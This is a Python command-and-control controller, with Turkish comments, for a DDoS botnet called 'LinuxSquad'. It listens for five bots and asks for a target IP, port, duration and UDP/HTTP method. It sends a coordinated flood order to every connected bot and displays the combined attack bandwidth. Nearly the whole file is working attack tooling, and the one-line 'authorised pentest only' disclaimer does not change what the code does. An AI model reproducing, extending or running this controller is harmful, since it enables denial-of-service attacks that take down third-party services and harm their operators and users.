#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# C&C Controller - LinuxSquad DDoS Botnet v2
# Yalnızca izinli pentest ortamında kullanınız.

import socket
import threading
import json
import time
import os
import sys

os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════╗")
print("║        LINUXSQUAD C&C CONTROLLER v2 - BOTNET KOORDİNATÖR        ║")
print("╚══════════════════════════════════════════════════════════════════╝")
print("\033[0m")

# ==================== KONFİGÜRASYON ====================
BOTS = {
    "Kalkan":    {"ip": "", "port": 9001, "online": False, "stats": {}},
    "Mızrak":    {"ip": "", "port": 9002, "online": False, "stats": {}},
    "Yıldırım":  {"ip": "", "port": 9003, "online": False, "stats": {}},
    "Cehennem":  {"ip": "", "port": 9004, "online": False, "stats": {}},
    "Fırtına":   {"ip": "", "port": 9005, "online": False, "stats": {}},
}

LISTEN_IP = "0.0.0.0"
HEDEF_IP = ""
HEDEF_PORT = 0
SALDIRI_SURESI = 0
METOD = "mixed"

# ==================== İSTATİSTİK ====================
raporlar = {}
rapor_lock = threading.Lock()

# ==================== BOT DİNLEYİCİ ====================
def bot_dinleyici(bot_adi, port):
    """Her bot için ayrı bir thread'de dinleme yapar"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, port))
    server.listen(1)
    server.settimeout(None)
    
    print(f"\033[93m[+] {bot_adi} bağlantısı için port {port} dinleniyor...\033[0m")
    
    while True:
        try:
            conn, addr = server.accept()
            BOTS[bot_adi]["ip"] = addr[0]
            BOTS[bot_adi]["online"] = True
            print(f"\033[92m[✓] {bot_adi} bağlandı! ({addr[0]}:{port})\033[0m")
            
            while True:
                try:
                    data = conn.recv(65536)
                    if not data:
                        break
                    mesaj = json.loads(data.decode())
                    
                    with rapor_lock:
                        raporlar[bot_adi] = mesaj
                        
                    if "status" in mesaj and mesaj["status"] == "alive":
                        pass  # Heartbeat
                    elif "stats" in mesaj:
                        s = mesaj["stats"]
                        print(f"\033[96m[STATS - {bot_adi}] UDP: {s.get('udp_packets',0):,} pkt | HTTP: {s.get('http_requests',0):,} req | Hata: {s.get('errors',0)}\033[0m")
                except:
                    break
            
            BOTS[bot_adi]["online"] = False
            print(f"\033[91m[-] {bot_adi} bağlantısı koptu\033[0m")
            conn.close()
        except:
            time.sleep(1)

# ==================== KOMUT GÖNDER ====================
def tum_botlara_komut_gonder(komut):
    """Tüm botlara saldırı emri gönderir"""
    komut_json = json.dumps(komut) + "\n"
    
    for bot_adi, info in BOTS.items():
        if info["online"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((info["ip"], info["port"]))
                s.send(komut_json.encode())
                s.close()
                print(f"\033[92m[→] {bot_adi}'e komut gönderildi\033[0m")
            except:
                print(f"\033[91m[!] {bot_adi}'e komut gönderilemedi\033[0m")

def tum_botlara_durdur_gonder():
    """Tüm botlara durdurma emri gönderir"""
    komut = json.dumps({"komut": "durdur"}) + "\n"
    for bot_adi, info in BOTS.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((info["ip"], info["port"]))
            s.send(komut.encode())
            s.close()
        except:
            pass
    print("\033[91m[■] Tüm botlara durdurma emri gönderildi\033[0m")

# ==================== TOPLAM BAND GENİŞLİĞİ ====================
def toplam_bant_hesapla():
    """Tüm botlardan gelen raporları toplar ve toplam bant genişliğini gösterir"""
    while True:
        time.sleep(3)
        with rapor_lock:
            if not raporlar:
                continue
            
            toplam_udp = sum(r.get("stats", {}).get("udp_bytes", 0) for r in raporlar.values())
            toplam_http = sum(r.get("stats", {}).get("http_requests", 0) for r in raporlar.values())
            toplam_hata = sum(r.get("stats", {}).get("errors", 0) for r in raporlar.values())
            gecen_sure = time.time() - list(raporlar.values())[0].get("baslangic", time.time())
            
            if gecen_sure < 1:
                continue
                
            mbps = (toplam_udp * 8) / (gecen_sure * 1_000_000)
            gbps = mbps / 1000
            rps = toplam_http / gecen_sure
            
            online_sayisi = sum(1 for b in BOTS.values() if b["online"])
            
            print(f"\n\033[92m╔══════════════════════════════════════════════════════╗\033[0m")
            print(f"\033[92m║  🔥 TOPLAM SALDIRI GÜCÜ (Online Bot: {online_sayisi}/5)   ║\033[0m")
            print(f"\033[92m╠══════════════════════════════════════════════════════╣\033[0m")
            print(f"\033[92m║  📡 UDP: {mbps:,.0f} Mbps ({gbps:.2f} Gbps)                       ║\033[0m")
            print(f"\033[92m║  📨 HTTP RPS: {rps:,.0f}                              ║\033[0m")
            print(f"\033[92m║  ❌ Toplam Hata: {toplam_hata:,}                            ║\033[0m")
            print(f"\033[92m╚══════════════════════════════════════════════════════╝\033[0m\n")

# ==================== ANA MENÜ ====================
def ana_menu():
    global HEDEF_IP, HEDEF_PORT, SALDIRI_SURESI, METOD
    
    print("\n\033[96m=== HEDEF KONFİGÜRASYONU ===\033[0m")
    HEDEF_IP = input("Hedef IP: ").strip()
    HEDEF_PORT = int(input("Hedef Port: ").strip())
    SALDIRI_SURESI = int(input("Saldırı süresi (saniye, 0=süresiz): ").strip() or "0")
    METOD = input("Metod (udp/http/mixed): ").strip().lower() or "mixed"
    
    print(f"\n\033[93m[!] Hedef: {HEDEF_IP}:{HEDEF_PORT} | Süre: {SALDIRI_SURESI}s | Metod: {METOD.upper()}\033[0m")
    
    input("\n\033[93mBotların bağlanmasını bekleyin. Devam etmek için ENTER...\033[0m")
    
    online_botlar = sum(1 for b in BOTS.values() if b["online"])
    print(f"\033[92m[+] {online_botlar}/5 bot çevrimiçi\033[0m")
    
    if online_botlar == 0:
        print("\033[91m[!] Hiçbir bot bağlı değil! Botları çalıştırın.\033[0m")
        return
    
    # Saldırı komutunu hazırla
    komut = {
        "komut": "saldir",
        "hedef_ip": HEDEF_IP,
        "hedef_port": HEDEF_PORT,
        "metod": METOD,
        "concurrency": 800,
        "sure": SALDIRI_SURESI
    }
    
    # Onay
    onay = input(f"\n\033[91m[!] {online_botlar} bot ile saldırı başlatılsın mı? (e/H): \033[0m")
    if onay.lower() != "e":
        print("\033[93m[-] İptal edildi\033[0m")
        return
    
    # Saldırıyı başlat
    print(f"\n\033[92m[+] {online_botlar} bot ile saldırı başlatılıyor...\033[0m")
    tum_botlara_komut_gonder(komut)
    
    # Toplam bant genişliği takibi
    bant_thread = threading.Thread(target=toplam_bant_hesapla, daemon=True)
    bant_thread.start()
    
    # Süre dolana kadar bekle veya Ctrl+C bekle
    try:
        if SALDIRI_SURESI > 0:
            print(f"\033[93m[+] {SALDIRI_SURESI} saniye kalan süre...\033[0m")
            time.sleep(SALDIRI_SURESI)
        else:
            print("\033[93m[+] Süresiz modda çalışıyor. Ctrl+C ile durdurun.\033[0m")
            while True:
                time.sleep(10)
    except KeyboardInterrupt:
        print("\n\033[91m[-] Durduruluyor...\033[0m")
    finally:
        tum_botlara_durdur_gonder()
        print("\033[92m[+] Test tamamlandı.\033[0m")

# ==================== ANA BAŞLAT ====================
if __name__ == "__main__":
    # Bot dinleyicilerini başlat
    for bot_adi, info in BOTS.items():
        t = threading.Thread(target=bot_dinleyici, args=(bot_adi, info["port"]), daemon=True)
        t.start()
        time.sleep(0.1)
    
    # Botların bağlanması için bekle
    print("\n\033[93m[!] Botların bağlanması bekleniyor... (Bot scriptlerini çalıştırın)\033[0m")
    time.sleep(3)
    
    try:
        ana_menu()
    except KeyboardInterrupt:
        print("\n\033[91m[-] C&C kapatılıyor...\033[0m")
        tum_botlara_durdur_gonder()
